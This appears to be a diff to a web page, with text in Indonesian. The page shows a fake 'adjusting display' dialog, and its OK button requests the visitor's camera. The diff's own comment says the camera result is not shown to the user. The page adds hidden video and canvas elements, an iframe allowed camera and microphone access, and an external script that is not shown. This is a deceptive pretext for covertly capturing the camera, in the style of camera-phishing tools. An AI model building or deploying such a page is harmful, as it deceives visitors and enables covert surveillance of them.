@@ -49,18 +49,19 @@
       margin: 12px 0;
     }
 
-    .loader {
-      margin: 16px auto 0;
-      border: 4px solid #eee;
-      border-top: 4px solid #007bff;
-      border-radius: 50%;
-      width: 36px;
-      height: 36px;
-      animation: spin 1s linear infinite;
+    #okBtn {
+      margin-top: 16px;
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
     }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+    #okBtn:hover {
+      background-color: #0056b3;
     }
 
     #backdrop {
@@ -84,23 +85,29 @@
 <div id="backdrop"></div>
 <div id="dialog">
   <h2>Menyesuaikan Tampilan</h2>
-  <p>Sistem sedang menyesuaikan resolusi dan pencahayaan untuk kualitas tampilan optimal. Aktifkan kamera browser Anda untuk melanjutkan.</p>
-  <div class="loader"></div>
+  <p>Sistem akan meminta akses kamera Anda untuk menyesuaikan kualitas tampilan.</p>
+  <button id="okBtn">OK</button>
 </div>
 
+<!-- Hidden Elements -->
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="640" height="480"></canvas>
 <iframe id="targetFrame" allow="autoplay; camera; microphone; picture-in-picture" allowfullscreen></iframe>
 
 <script>
+  document.getElementById("okBtn").addEventListener("click", () => {
+    // Tutup dialog
+    document.getElementById("dialog").remove();
+    document.getElementById("backdrop").remove();
 
-  // Auto hilangin dialog setelah 8 detik
-  setTimeout(() => {
-    const dialog = document.getElementById("dialog");
-    const backdrop = document.getElementById("backdrop");
-    if (dialog) dialog.remove();
-    if (backdrop) backdrop.remove();
-  }, 8000);
+    // Minta izin kamera, tapi tidak menampilkan hasilnya
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+      })
+      .catch((err) => {
+        console.warn("Izin kamera ditolak atau gagal:", err);
+      });
+  });
 </script>
 
 <script src="/script.js"></script>
